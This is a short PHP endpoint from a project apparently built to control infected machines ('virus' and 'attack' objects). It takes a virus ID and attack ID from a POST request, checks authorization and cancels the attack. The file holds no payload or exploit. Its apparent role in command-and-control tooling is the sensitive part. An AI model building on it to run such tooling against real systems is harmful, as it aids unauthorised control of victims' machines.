<?php

use Kelvinho\Virus\Singleton\Header;

$virus_id = $requestData->postCheck("virus_id");
$attack_id = $requestData->postCheck("attack_id");

if (!$authenticator->authorized($virus_id, $attack_id)) Header::forbidden();

$attack = $attackFactory->get($attack_id);
$attack->cancel();
$attack->saveState();
Header::ok();
